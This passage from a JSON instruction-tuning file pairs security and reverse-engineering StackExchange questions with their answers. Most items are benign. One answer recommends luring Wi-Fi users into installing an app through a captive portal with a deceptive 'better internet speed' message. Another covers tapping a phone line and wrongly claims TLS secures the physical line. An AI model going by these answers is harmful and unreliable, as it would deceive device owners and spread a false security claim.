    "instruction": "Answer the question below.\nI fortuitously accessed the configuration of unknown router: how come and what now?\nI've encountered a strange thing. I connected to an open Wi-Fi, then I was just fooling around. First, I visited 192.168.0.1 and it was a router configuration page but default password didn't work.\nThen I navigated to 192.186.1.1 and I saw the configurator of a completely different router that isn't even on this network. The SSID is different and encrypted with WPA2-PSK. The default username and password (admin/admin) worked.\nHow come I managed to connect to it? How can I notify the owner? Is it illegal?\nHere's a screenshot:",
    "context": "",
    "output": "Do a tracert,   you're connected because those two routers are probably routing between each other. The moment you logged in your crossed the line of legality. So yes it's illegal. You find the owner by asking around who set up the AP's.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "I fortuitously accessed the configuration of unknown router: how come and what now?\nI've encountered a strange thing. I connected to an open Wi-Fi, then I was just fooling around. First, I visited 192.168.0.1 and it was a router configuration page but default password didn't work.\nThen I navigated to 192.186.1.1 and I saw the configurator of a completely different router that isn't even on this network. The SSID is different and encrypted with WPA2-PSK. The default username and password (admin/admin) worked.\nHow come I managed to connect to it? How can I notify the owner? Is it illegal?\nHere's a screenshot:",
      "answer": "Do a tracert,   you're connected because those two routers are probably routing between each other. The moment you logged in your crossed the line of legality. So yes it's illegal. You find the owner by asking around who set up the AP's."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Practical advantage of requiring VPN for SSH\nI have some VPS servers which I manage through ssh. However there are many ports which I want open during development, therefore I also have OpenVPN on them. \nNow I am wondering if it would make sense requiring a OpenVPN connection for ssh access. Is there any practical security advantage on a ssh connection through a VPN (same server) vs a direct ssh access?",
    "context": "",
    "output": "answer: The first response that comes to mind is: \"Only if you want to slow down your SSH sessions even more.\"\nOpenVPN and SSH perform very similar tasks in very similar ways. Assuming that you have set up your SSH in a secure way, you are not increasing your protection against the typical threat scenarios. \nThat said, if you are extremely paranoid about your encrypted connections getting decrypted (by government alphabet soup, et al.), then tunneling your tunnels might delay them further. But, this threat is the only one that I can imagine that SSH in an OpenVPN tunnel would protect against.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Practical advantage of requiring VPN for SSH\nI have some VPS servers which I manage through ssh. However there are many ports which I want open during development, therefore I also have OpenVPN on them. \nNow I am wondering if it would make sense requiring a OpenVPN connection for ssh access. Is there any practical security advantage on a ssh connection through a VPN (same server) vs a direct ssh access?",
      "answer": "The first response that comes to mind is: \"Only if you want to slow down your SSH sessions even more.\"\nOpenVPN and SSH perform very similar tasks in very similar ways. Assuming that you have set up your SSH in a secure way, you are not increasing your protection against the typical threat scenarios. \nThat said, if you are extremely paranoid about your encrypted connections getting decrypted (by government alphabet soup, et al.), then tunneling your tunnels might delay them further. But, this threat is the only one that I can imagine that SSH in an OpenVPN tunnel would protect against."
    }
  },
  {
    "instruction": "Q: XSS vulnerability through burp suite\nI am getting a XSS vulnerability through burp suite but when I inject script manually I don't get the XSS vulnerability. \nIs this a reportable vulnerability?",
    "context": "",
    "output": " A: If you can't verify the result of an automated tool, it is not a good idea to report it's findings. \nAutomated tools are great, but they have a problem with false positives.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "XSS vulnerability through burp suite\nI am getting a XSS vulnerability through burp suite but when I inject script manually I don't get the XSS vulnerability. \nIs this a reportable vulnerability?",
      "answer": "If you can't verify the result of an automated tool, it is not a good idea to report it's findings. \nAutomated tools are great, but they have a problem with false positives."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow does does the \"Sign out all other sessions\" feature work in Gmail?\nIn Gmail, at the bottom of the screen if you click Details it will show you your recent account activity and there's a button to sign you out of all other sessions. How does this work? Are they somehow revoking cookies from the server side?",
    "context": "",
    "output": "This is a pretty simple task to accomplish.\nBasically the server will store the session IDs of each individual active session in a database somewhere. Revoking a particular session is a simple task of removing the record from the database, which will invalidate the session.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does does the \"Sign out all other sessions\" feature work in Gmail?\nIn Gmail, at the bottom of the screen if you click Details it will show you your recent account activity and there's a button to sign you out of all other sessions. How does this work? Are they somehow revoking cookies from the server side?",
      "answer": "This is a pretty simple task to accomplish.\nBasically the server will store the session IDs of each individual active session in a database somewhere. Revoking a particular session is a simple task of removing the record from the database, which will invalidate the session."
    }
  },
  {
    "instruction": "Question: windows firewall turns OFF automatically\nIt seems pretty weird but for some reason, the Windows 7 firewall turns off. After I turn the firewall on in the control panel, it seems that it turns itself off when I go back to the control after I reboot. Note that I'm using AVG Internet Security 2012 and Windows 7 x64 Pro.\nIs this normal behavior? Is AVG turning the Windows Firewall off automatically?\nThanks for your suggestions.",
    "context": "",
    "output": "Answer: AVG Internet Security 2012 includes its own firewall function, and so yes, it shuts down the Windows Firewall when it runs. Running multiple host firewalls on Windows is unpredictable and not recommended.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "windows firewall turns OFF automatically\nIt seems pretty weird but for some reason, the Windows 7 firewall turns off. After I turn the firewall on in the control panel, it seems that it turns itself off when I go back to the control after I reboot. Note that I'm using AVG Internet Security 2012 and Windows 7 x64 Pro.\nIs this normal behavior? Is AVG turning the Windows Firewall off automatically?\nThanks for your suggestions.",
      "answer": "AVG Internet Security 2012 includes its own firewall function, and so yes, it shuts down the Windows Firewall when it runs. Running multiple host firewalls on Windows is unpredictable and not recommended."
    }
  },
  {
    "instruction": "Question: When updating a subkey's expiration date, do old backups of my private master key become invalid?\nIn GnuPG I have a master key that doesn't expire, with separate subkeys with one year expiration time for encryption, authentication, and signing. If I update the expiration dates of my subkeys, will I need to make new backup copies of my private master key?",
    "context": "",
    "output": "Answer: The expiration date of subkeys is stored in a special kind of signature issued by the primary master key on the subkey. With other words, if you change the expiration date, no private keys are changed at all. If you can restore the public key later (for example, fetching it from the key server network), you're fine.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "When updating a subkey's expiration date, do old backups of my private master key become invalid?\nIn GnuPG I have a master key that doesn't expire, with separate subkeys with one year expiration time for encryption, authentication, and signing. If I update the expiration dates of my subkeys, will I need to make new backup copies of my private master key?",
      "answer": "The expiration date of subkeys is stored in a special kind of signature issued by the primary master key on the subkey. With other words, if you change the expiration date, no private keys are changed at all. If you can restore the public key later (for example, fetching it from the key server network), you're fine."
    }
  },
  {
    "instruction": "Q: Is it possible to force a user to install an apk while connecting to my WiFi?\nWhile user connects to my wifi network, I want to install the app on the user phone to encrypt the request. Is it possible to achieve?",
    "context": "",
    "output": " A: Best approach to your case is to use Captive Portal\nIt's a login page that requires username and password to access the internet, you most likely have encountered this when using public wifi networks in airports or coffee shops.\nI haven't tried it, but try replacing the username and password fields with a download button and use some social engineering techniques like saying 'Download app to have better internet speed!'\nHere's a link to learn more about captive portal setup.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it possible to force a user to install an apk while connecting to my WiFi?\nWhile user connects to my wifi network, I want to install the app on the user phone to encrypt the request. Is it possible to achieve?",
      "answer": "Best approach to your case is to use Captive Portal\nIt's a login page that requires username and password to access the internet, you most likely have encountered this when using public wifi networks in airports or coffee shops.\nI haven't tried it, but try replacing the username and password fields with a download button and use some social engineering techniques like saying 'Download app to have better internet speed!'\nHere's a link to learn more about captive portal setup."
    }
  },
  {
    "instruction": "What is the answer to this question - Understanding suspicious HTTP GET Request\nI was looking through my Apache log files and besides other GET requests with response status codes of 4XX (error), I've found this one which has a 200 (success) response status code:\n\"GET /?rest_route=/wp/v2/users/ HTTP/1.1\" 200 5453 \"-\" \"Go-http-client/1.1\"\n\nFirst of all, the status code 200 doesn't imply that the request was successful in regards to passing a variable successfully, correct? How would I check then, if such a probe/attack was successful? Would I manually need to go into my files and scan through the code if such a request would do something malicious?\nLastly, what was the bot (I assume it is a bot) trying to achieve with this request specifically? Is it trying to get some data about WordPress users?\n\n",
    "context": "",
    "output": "The reason it counts as \"success\" is because of the beginning:\n/?...\n\nThis means the path the server cares about is /, which likely maps to the index of your web application. The query string after, ?rest_route=/wp/v2/users/, is likely ignored by your web application.\nIn fact, you can try this on a bunch of websites, such as security.stackexchange.com/?rest_route=/wp/v2/users/ and you will get a 200 Success code returned.\nHow can I check if it was successful?\nIn this example, thw \"/wp/v2/users/\" indicates that the attacker was likely trying to exploit a wordpress misconfiguration to retrieve the list of users through a REST API. If you open your page with that URL and see just the normal index, then it's safe to say that attempt failed.\nAs for a general answer...that's hard to say. The whole field of digital forensics and incident response is about identifying such indicators of compromise.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Understanding suspicious HTTP GET Request\nI was looking through my Apache log files and besides other GET requests with response status codes of 4XX (error), I've found this one which has a 200 (success) response status code:\n\"GET /?rest_route=/wp/v2/users/ HTTP/1.1\" 200 5453 \"-\" \"Go-http-client/1.1\"\n\nFirst of all, the status code 200 doesn't imply that the request was successful in regards to passing a variable successfully, correct? How would I check then, if such a probe/attack was successful? Would I manually need to go into my files and scan through the code if such a request would do something malicious?\nLastly, what was the bot (I assume it is a bot) trying to achieve with this request specifically? Is it trying to get some data about WordPress users?",
      "answer": "The reason it counts as \"success\" is because of the beginning:\n/?...\n\nThis means the path the server cares about is /, which likely maps to the index of your web application. The query string after, ?rest_route=/wp/v2/users/, is likely ignored by your web application.\nIn fact, you can try this on a bunch of websites, such as security.stackexchange.com/?rest_route=/wp/v2/users/ and you will get a 200 Success code returned.\nHow can I check if it was successful?\nIn this example, thw \"/wp/v2/users/\" indicates that the attacker was likely trying to exploit a wordpress misconfiguration to retrieve the list of users through a REST API. If you open your page with that URL and see just the normal index, then it's safe to say that attempt failed.\nAs for a general answer...that's hard to say. The whole field of digital forensics and incident response is about identifying such indicators of compromise."
    }
  },
  {
    "instruction": "What is the answer to this question - How to view string references?\nI have attached debugger to process/application (exe), but when i go to string references, it shows ntdll.dll references, instead of program.\nhow to get the references from program itself?\nis it protected?\n\n",
    "context": "",
    "output": "When x64dbg attaches to a process it will first stop at the 'Attach breakpoint'. The button to search for string references will search the module currently shown in the disassembly. To search in another module you simply have to go there.\nOne way to do this is to go to the Symbols tab and double click the module you are interested in. This should take you to the code section of the module. From there you can press the button to search for string references.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to view string references?\nI have attached debugger to process/application (exe), but when i go to string references, it shows ntdll.dll references, instead of program.\nhow to get the references from program itself?\nis it protected?",
      "answer": "When x64dbg attaches to a process it will first stop at the 'Attach breakpoint'. The button to search for string references will search the module currently shown in the disassembly. To search in another module you simply have to go there.\nOne way to do this is to go to the Symbols tab and double click the module you are interested in. This should take you to the code section of the module. From there you can press the button to search for string references."
    }
  },
  {
    "instruction": "Question: Changing a label's text on window\nI'm using OllyDbg v2 for debugging. Target is a simple executable file with few labels. It has been written in C++ builder. Looks like labels are located dynamically, so I can't get its text using OllyDbg, let alone changing the text. What should I do?",
    "context": "",
    "output": "Answer: Open the executable in resource hacker see if you can see them with that",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Changing a label's text on window\nI'm using OllyDbg v2 for debugging. Target is a simple executable file with few labels. It has been written in C++ builder. Looks like labels are located dynamically, so I can't get its text using OllyDbg, let alone changing the text. What should I do?",
      "answer": "Open the executable in resource hacker see if you can see them with that"
    }
  },
  {
    "instruction": "Answer this question:\n\nHow do I load an executable into IDA without it correcting relocatable references?\nI am working with a dumped program, and I essentially want to load it into IDA without performing any (relocation) address fixups. Is there a way to do this?\nI have tried the following without success:\n1. Manually loading it, and choosing not to load the .reloc section\n2. Rebasing the image base to zero",
    "context": "",
    "output": "A: I found that if I chose a load address manually, IDA would offset these references by whatever address I chose. If I didn't choose a load address manually, then IDA wouldn't change those references, so then all I needed to do was rebase the program without performing fixups.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I load an executable into IDA without it correcting relocatable references?\nI am working with a dumped program, and I essentially want to load it into IDA without performing any (relocation) address fixups. Is there a way to do this?\nI have tried the following without success:\n1. Manually loading it, and choosing not to load the .reloc section\n2. Rebasing the image base to zero",
      "answer": "I found that if I chose a load address manually, IDA would offset these references by whatever address I chose. If I didn't choose a load address manually, then IDA wouldn't change those references, so then all I needed to do was rebase the program without performing fixups."
    }
  },
  {
    "instruction": "How to call a func in an executable binary?\nI have a binary with a func that I can disassemble.  What are simple ways for me to call it with arbitrary args and observe its return val and behavior?\nIdeally, I'd like to do this:\n\nWithin gdb (or gdb-peda)\nFrom C (ie linking to the executable as if its a lib)\nVia Python scripts (I recall reading about a Python script to do this, but can't find it)\n\nI'm operating on Linux, but this question is relevant to other OS as well.",
    "context": "",
    "output": "LIEF\nIf the binary is a PIE, exporting functions via the LIEF binary instrumentation framework should allow you to call the function you are interested in as if it was a function in a shared object.\n\nExample: LIEF - Transforming an ELF executable into a library\n\nLD_PRELOAD\nIf the binary is dynamically linked and contains code for setting up the standard C runtime environment e.g. __libc_start_main calling main(), you can hook these functions with LD_PRELOAD and interpose your own code via shared library injection which calls the target function directly with arguments of your choosing.\n\nExample: Modern Vulnerability Research Techniques on Embedded Systems\nExample: Hook main() using LD_PRELOAD \n\nQiling emulator\nUsing the Qiling emulator, you can record the state of the program and then replay the target function in GDB. Since the code is being emulated, it is straightforward to manipulate any aspect of the process' state (registers, memory, etc.)\n\nExample: qiling/examples/hello_x8664_linux_part_debug.py\n\nDBI\nUsing Frida, Pin, DynamoRIO etc. you can basically make the program do what you want at run time, in this case hook a function, manipulate its arguments and observe the subsequent behavior.\n\nExample: Getting Started with Frida : Hooking a Function and Replacing its Arguments\nExample: Pin 3.21 User Guide: Finding the Value of Function Arguments\n\nTrampolining with e9patch\ne9patch is a static binary rewriting tool that allows one to change/insert code prior to run time.\n\nExample: e9tool user guide\nExample: e9afl\n\nThere are probably even more ways to do this, such as process snapshotting with ptrace and /proc and then manipulating registers and memory with ptrace, emulation with PANDA, emulation with Unicorn, emulation with QEMU, possibly even ELF parasite code or inserting code that calls the target function using LD_PRELOAD together with __attribute__ ((constructor)) injected_function(). You have a lot of options.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to call a func in an executable binary?\nI have a binary with a func that I can disassemble.  What are simple ways for me to call it with arbitrary args and observe its return val and behavior?\nIdeally, I'd like to do this:\n\nWithin gdb (or gdb-peda)\nFrom C (ie linking to the executable as if its a lib)\nVia Python scripts (I recall reading about a Python script to do this, but can't find it)\n\nI'm operating on Linux, but this question is relevant to other OS as well.",
      "answer": "LIEF\nIf the binary is a PIE, exporting functions via the LIEF binary instrumentation framework should allow you to call the function you are interested in as if it was a function in a shared object.\n\nExample: LIEF - Transforming an ELF executable into a library\n\nLD_PRELOAD\nIf the binary is dynamically linked and contains code for setting up the standard C runtime environment e.g. __libc_start_main calling main(), you can hook these functions with LD_PRELOAD and interpose your own code via shared library injection which calls the target function directly with arguments of your choosing.\n\nExample: Modern Vulnerability Research Techniques on Embedded Systems\nExample: Hook main() using LD_PRELOAD \n\nQiling emulator\nUsing the Qiling emulator, you can record the state of the program and then replay the target function in GDB. Since the code is being emulated, it is straightforward to manipulate any aspect of the process' state (registers, memory, etc.)\n\nExample: qiling/examples/hello_x8664_linux_part_debug.py\n\nDBI\nUsing Frida, Pin, DynamoRIO etc. you can basically make the program do what you want at run time, in this case hook a function, manipulate its arguments and observe the subsequent behavior.\n\nExample: Getting Started with Frida : Hooking a Function and Replacing its Arguments\nExample: Pin 3.21 User Guide: Finding the Value of Function Arguments\n\nTrampolining with e9patch\ne9patch is a static binary rewriting tool that allows one to change/insert code prior to run time.\n\nExample: e9tool user guide\nExample: e9afl\n\nThere are probably even more ways to do this, such as process snapshotting with ptrace and /proc and then manipulating registers and memory with ptrace, emulation with PANDA, emulation with Unicorn, emulation with QEMU, possibly even ELF parasite code or inserting code that calls the target function using LD_PRELOAD together with __attribute__ ((constructor)) injected_function(). You have a lot of options."
    }
  },
  {
    "instruction": "Please answer this question: Where to find (free) training in reverse engineering?\nCan someone give a list of websites with good (and free) reverse engineering training exercises ?",
    "context": "",
    "output": "Here are the websites I know:\n\nroot-me.\ncrackmes.one.\nOver the Wire.\nLe Hack.\nHacking Labs.\nSmash the Stack.\nMatasano Microcorruption.\nMatasano Crypto-challenge.\nPentesterlab.\nHackTheBox.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Where to find (free) training in reverse engineering?\nCan someone give a list of websites with good (and free) reverse engineering training exercises ?",
      "answer": "Here are the websites I know:\n\nroot-me.\ncrackmes.one.\nOver the Wire.\nLe Hack.\nHacking Labs.\nSmash the Stack.\nMatasano Microcorruption.\nMatasano Crypto-challenge.\nPentesterlab.\nHackTheBox."
    }
  },
  {
    "instruction": "What is the answer to this question - Is it recommended to send an authentication request to the Resource Owner (by the Authorization Server) if it already has an active session?\nIn OAuth 2.0 Authorization Code Flow (Grant Type), is it recommended (or is it maybe even a best practice) to send an authentication request (e.g. a login-request form) to the Resource Owner (by the Authorization Server), even if the Resource Owner has already an active session on the Authorization Server, when obtaining an Authorization Code for the first time for a certain Client? \nIn other words, is it recommended to kill/destroy a currently active session first, if there's one? Or is it not important at all?\n\n",
    "context": "",
    "output": "Actually you won't know from the client side whether the resource owner has an active web session on the authorization server or not, and it's not the client's matter.\nThat's however up to the authorization to decide what to do, for instance:\n\nAuthenticate if the resource owner is not logged in\nGrant immediate access without logging in again if the resource owner has already logged in, or reauthenticate him (for instance if he logged in more than 7 days ago) by killing or updating the session. Reauthentication can also consist in requiring a second factor (SMS OTP...)\nMake the resource owner authorize some scopes he has not approved yet\nOr even ask him to approve new CGUs\nEtc\n\nIn a nutshell, it's the authorization server's matter to decide what to do (i.e. applying an authentication and authorization policy), not the client's.\nIf the resource owner is already logged in, has approved the requested scope, etc. then the server will redirect to the client directly with an authorization code. In this case a blank page will shortly appear, the URL will change swiftly (redirects) before the resource owner is redirected to the client. This is how SSO (Single Sign-On) works.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it recommended to send an authentication request to the Resource Owner (by the Authorization Server) if it already has an active session?\nIn OAuth 2.0 Authorization Code Flow (Grant Type), is it recommended (or is it maybe even a best practice) to send an authentication request (e.g. a login-request form) to the Resource Owner (by the Authorization Server), even if the Resource Owner has already an active session on the Authorization Server, when obtaining an Authorization Code for the first time for a certain Client? \nIn other words, is it recommended to kill/destroy a currently active session first, if there's one? Or is it not important at all?",
      "answer": "Actually you won't know from the client side whether the resource owner has an active web session on the authorization server or not, and it's not the client's matter.\nThat's however up to the authorization to decide what to do, for instance:\n\nAuthenticate if the resource owner is not logged in\nGrant immediate access without logging in again if the resource owner has already logged in, or reauthenticate him (for instance if he logged in more than 7 days ago) by killing or updating the session. Reauthentication can also consist in requiring a second factor (SMS OTP...)\nMake the resource owner authorize some scopes he has not approved yet\nOr even ask him to approve new CGUs\nEtc\n\nIn a nutshell, it's the authorization server's matter to decide what to do (i.e. applying an authentication and authorization policy), not the client's.\nIf the resource owner is already logged in, has approved the requested scope, etc. then the server will redirect to the client directly with an authorization code. In this case a blank page will shortly appear, the URL will change swiftly (redirects) before the resource owner is redirected to the client. This is how SSO (Single Sign-On) works."
    }
  },
  {
    "instruction": "Question: Break encryption by applying accidental-overwrite techniques\nI read that there are ways, at least on mechanical drives, to sometimes recover data that was overwritten (not just deleted).\nNow I was wondering if it was theoretically possible to break a fresh encryption of a partition that already held data (so no wiping or anything done) by applying the same (probably expensive) approach - treating the encryption as an accidental overwrite.\nI'm only using encryption to protect my self against losing my notebook, not to protect my data against dedicated experts with lots of funds at their disposal (they'll just steal my passphrase anyway), but I was just wondering if the described way is feasible.",
    "context": "",
    "output": "Answer: No one has ever actually demonstrated successful recovery of overwritten data on  a modern hard drive. It's an urban legend stemming from the days of hard drives with capacities orders of magnitude lower, which had enough inefficiency in their data storage that it was potentially an issue. See this Wikipedia article and its references.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Break encryption by applying accidental-overwrite techniques\nI read that there are ways, at least on mechanical drives, to sometimes recover data that was overwritten (not just deleted).\nNow I was wondering if it was theoretically possible to break a fresh encryption of a partition that already held data (so no wiping or anything done) by applying the same (probably expensive) approach - treating the encryption as an accidental overwrite.\nI'm only using encryption to protect my self against losing my notebook, not to protect my data against dedicated experts with lots of funds at their disposal (they'll just steal my passphrase anyway), but I was just wondering if the described way is feasible.",
      "answer": "No one has ever actually demonstrated successful recovery of overwritten data on  a modern hard drive. It's an urban legend stemming from the days of hard drives with capacities orders of magnitude lower, which had enough inefficiency in their data storage that it was potentially an issue. See this Wikipedia article and its references."
    }
  },
  {
    "instruction": "Q: PXE TFTP Vulnerabilities\nI am planning to implement diskless clients for booting Windows 7 clients. I am trying to determine whether to use PXE with TFTP or iPXE with HTTPS or iSCSI.\nAre there any vulnerabilities with using PXE and TFTP that may justify using iPXE instead? Does TFTP provide any sort of security?",
    "context": "",
    "output": " A: TFTP is a very weak protocol, from a security point of view: it has no provision for security or authentication, uses UDP for transport which makes it extremely easy to spoof, intercept, DOS or manipulate by anyone on the same network.\niPXE, on the other hand, does implement authentication, data integrity and security: you just have to set it up.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "PXE TFTP Vulnerabilities\nI am planning to implement diskless clients for booting Windows 7 clients. I am trying to determine whether to use PXE with TFTP or iPXE with HTTPS or iSCSI.\nAre there any vulnerabilities with using PXE and TFTP that may justify using iPXE instead? Does TFTP provide any sort of security?",
      "answer": "TFTP is a very weak protocol, from a security point of view: it has no provision for security or authentication, uses UDP for transport which makes it extremely easy to spoof, intercept, DOS or manipulate by anyone on the same network.\niPXE, on the other hand, does implement authentication, data integrity and security: you just have to set it up."
    }
  },
  {
    "instruction": "Question: Dump the stack in Ollydbg\nIs there a way to dump the stack  of a program while debugging in ollydbg and store the result in a file  ?",
    "context": "",
    "output": "Answer: alt + k -> right click -> copy to clipboard whole table -> paste to notepad -> save",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Dump the stack in Ollydbg\nIs there a way to dump the stack  of a program while debugging in ollydbg and store the result in a file  ?",
      "answer": "alt + k -> right click -> copy to clipboard whole table -> paste to notepad -> save"
    }
  },
  {
    "instruction": "Q: GPG key expiration and storage\nI hope I came to right place to ask about GPG.\nI have created secret, public, and sign keys and set expiration dates for all keys in case I lose an access to them or forget a keyphrase, etc. I have read the GPG manual and a couple of blogs (e.g. this one) but I did not find answers to my questions.\n\nWhat is the best way to store the keys if I have to reinstall a system?\nCan I still have an access to expired keys and e.g. decrypt old files?",
    "context": "",
    "output": " A: Make sure the keys are protected by a good passphrase and export them to some trusted storage, such as USB stick.\nYes. You can even change expiration date of your keys just for yourself to make them valid again.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "GPG key expiration and storage\nI hope I came to right place to ask about GPG.\nI have created secret, public, and sign keys and set expiration dates for all keys in case I lose an access to them or forget a keyphrase, etc. I have read the GPG manual and a couple of blogs (e.g. this one) but I did not find answers to my questions.\n\nWhat is the best way to store the keys if I have to reinstall a system?\nCan I still have an access to expired keys and e.g. decrypt old files?",
      "answer": "Make sure the keys are protected by a good passphrase and export them to some trusted storage, such as USB stick.\nYes. You can even change expiration date of your keys just for yourself to make them valid again."
    }
  },
  {
    "instruction": "What is the answer to this question - Does word store my passwords in plaintext?\nI have a document which I wrote my passwords in and saved it to my disk, and I have been hearing a lot about programs storing passwords in plaintext\nDid word store my password I saved in plaintext???\nIf yes, how do I have a word with it?\n\n",
    "context": "",
    "output": "Did word store my password I saved in plaintext???\n\nThe answer is in your question. \"I have a document which I wrote my passwords in and saved it to my disk\" is the definition of saving password in plain text.\n\nIf yes, how do I have a word [document] with it?\n\nYou do not. That is, if you want to avoid saving passwords in plain text. Instead, you should use a password manager, such as Keepass (many others exist).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does word store my passwords in plaintext?\nI have a document which I wrote my passwords in and saved it to my disk, and I have been hearing a lot about programs storing passwords in plaintext\nDid word store my password I saved in plaintext???\nIf yes, how do I have a word with it?",
      "answer": "Did word store my password I saved in plaintext???\n\nThe answer is in your question. \"I have a document which I wrote my passwords in and saved it to my disk\" is the definition of saving password in plain text.\n\nIf yes, how do I have a word [document] with it?\n\nYou do not. That is, if you want to avoid saving passwords in plain text. Instead, you should use a password manager, such as Keepass (many others exist)."
    }
  },
  {
    "instruction": "Question: How to find where a subroutine is being called (ida)\nI am reversing an application using IDA. I have found a small subroutine that returns information at the end of that subroutine. However I would like to see the subroutine that uses this small subroutine I found and see how it uses the information returned by the small subroutine. \nI am new to this, is what Im trying to do a simple task, if so how can I do this? \nThanks for the help !",
    "context": "",
    "output": "Answer: It called x-refs. Go to the beginning of your routine, and press ctrl+x from disassembly view, or just x from the decompile view.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to find where a subroutine is being called (ida)\nI am reversing an application using IDA. I have found a small subroutine that returns information at the end of that subroutine. However I would like to see the subroutine that uses this small subroutine I found and see how it uses the information returned by the small subroutine. \nI am new to this, is what Im trying to do a simple task, if so how can I do this? \nThanks for the help !",
      "answer": "It called x-refs. Go to the beginning of your routine, and press ctrl+x from disassembly view, or just x from the decompile view."
    }
  },
  {
    "instruction": "What is the answer to this question - How can someone sniff dial-up connection using phone line?\nLet's assume we have a computer that sends packets to the internet using dial-up connection, and we have access to the analog data on the phone line(we have access to the phone line), how can we make a proper sniff for the data that is being transmitted through?\n\n",
    "context": "",
    "output": "If it is a PSTN line a simple tape recorder attached to the lines could do the trick.\nFor ISDN I suspect you need a DAC but its also easy, as long as you have physical access to the line.\nAny connection using a Telephone line (digital or analogue) is easy to understand for anyone that knows the encoding schema. To realy protect it you should use the same techniques as being used between computers. There we ue an encription layer in between the physical line and the interpretation layer (a.k.a. between the telephone receiver and the physical telephone line) \nThe current default implementation for this is the TLS Protocol, this encrypts everything but the name of the intended 'destination' (so phone number and name)\nBottom Line, if you want to protect your physical line use a TLS connection.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can someone sniff dial-up connection using phone line?\nLet's assume we have a computer that sends packets to the internet using dial-up connection, and we have access to the analog data on the phone line(we have access to the phone line), how can we make a proper sniff for the data that is being transmitted through?",
      "answer": "If it is a PSTN line a simple tape recorder attached to the lines could do the trick.\nFor ISDN I suspect you need a DAC but its also easy, as long as you have physical access to the line.\nAny connection using a Telephone line (digital or analogue) is easy to understand for anyone that knows the encoding schema. To realy protect it you should use the same techniques as being used between computers. There we ue an encription layer in between the physical line and the interpretation layer (a.k.a. between the telephone receiver and the physical telephone line) \nThe current default implementation for this is the TLS Protocol, this encrypts everything but the name of the intended 'destination' (so phone number and name)\nBottom Line, if you want to protect your physical line use a TLS connection."
    }
  },
  {
    "instruction": "What is the answer to this question - How to safely store infected PDF file that I have created?\nI have two computers, computer A and computer B.\nWith computer B I created an infected PDF file using setoolkit following this youtube toturial. The file is on a VM right now.\nOn computer A I have a file scanner software that scan files and tells if they are infected or not. I want to test the scanner therefore by scanning the infected PDF that I have created, \nI plan to send the infected file from computer B to my email and then to open the mail from computer A. Is it safe to store the infected file on computer A because I want to scan it?\n\n",
    "context": "",
    "output": "In your case (pdf file) you can safely store that file wherever you want as long as it is not read by any program affected by the bug your pdf file explotes. If instead of a pdf file it is an executable one then you can also store it wherever you want as long as you (or any other automated mechanism) don't execute it.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to safely store infected PDF file that I have created?\nI have two computers, computer A and computer B.\nWith computer B I created an infected PDF file using setoolkit following this youtube toturial. The file is on a VM right now.\nOn computer A I have a file scanner software that scan files and tells if they are infected or not. I want to test the scanner therefore by scanning the infected PDF that I have created, \nI plan to send the infected file from computer B to my email and then to open the mail from computer A. Is it safe to store the infected file on computer A because I want to scan it?",
      "answer": "In your case (pdf file) you can safely store that file wherever you want as long as it is not read by any program affected by the bug your pdf file explotes. If instead of a pdf file it is an executable one then you can also store it wherever you want as long as you (or any other automated mechanism) don't execute it."
    }
  },
  {
    "instruction": "Please answer this question: How Chrome avoids sslstrip?\nI'm trying out Moxie's sslstrip tool in my pentester lab. It works in all my VM's but no in all browsers. Firefox and IE are vulnerable but Chrome seems to has a protection against.\nAnyone know how Chrome defends against that tool?",
    "context": "",
    "output": "Google Chrome browser uses preloaded HSTS list. Firefox 17 (most recent release) also added support for the list. It is the same list that Google Chrome uses. HSTS, along with having HTTPS only website are best mitigations against such an attack. Your HTTP website should only permanently redirect to HTTPS and not provide any content.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How Chrome avoids sslstrip?\nI'm trying out Moxie's sslstrip tool in my pentester lab. It works in all my VM's but no in all browsers. Firefox and IE are vulnerable but Chrome seems to has a protection against.\nAnyone know how Chrome defends against that tool?",
      "answer": "Google Chrome browser uses preloaded HSTS list. Firefox 17 (most recent release) also added support for the list. It is the same list that Google Chrome uses. HSTS, along with having HTTPS only website are best mitigations against such an attack. Your HTTP website should only permanently redirect to HTTPS and not provide any content."
    }
  },
  {
